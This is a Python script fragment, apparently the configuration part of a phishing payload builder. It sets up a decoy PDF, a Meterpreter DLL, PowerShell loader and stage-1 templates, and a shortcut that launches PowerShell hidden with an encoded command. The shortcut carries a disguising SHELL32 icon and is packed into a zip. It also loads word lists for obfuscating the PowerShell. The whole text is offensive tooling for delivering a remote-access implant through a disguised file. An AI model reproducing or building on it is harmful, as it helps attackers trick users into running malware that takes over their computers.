import ast
import configparser
import os

pdf_length_placeholder = '#<PDF_FILELENGTH>'
dll_length_placeholder = '#<DLL_FILELENGTH>'
loader_length_placeholder = '#<LOADER_FILELENGTH>'

resources_dir = 'resources/'

loader_template = resources_dir + 'loader_template.ps1'
loader_outfile = resources_dir + 'loader.ps1'

stage1_template = resources_dir + 'stage1_command_template.ps1'
stage1_outfile = resources_dir + 'stage1_command.ps1'

pdf_filename = resources_dir + 'ds7002.pdf'
dll_filename = resources_dir + 'meterpreter.dll'

lnk_filename = resources_dir + 'ds7002.lnk'
zip_filename = 'ds7002.zip'

target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
argument_prefix = '-noni -noe -WindowStyle hidden -e '
icon = 'C:\\Windows\\System32\\SHELL32.dll'
icon_index = 1

config = configparser.ConfigParser()
PSconfigFile = os.path.abspath(os.path.dirname(__file__)) + '/tools/pyfuscation' + '/PSconfig.ini'
print('PSconfigFile: ' + PSconfigFile)
config.read(PSconfigFile)
global Reseverd 
Reseverd = ast.literal_eval(config.get('PS_Reserverd', 'f'))
global lower_Reserverd
lower_Reserverd = list(map(lambda x:x.lower(),Reseverd))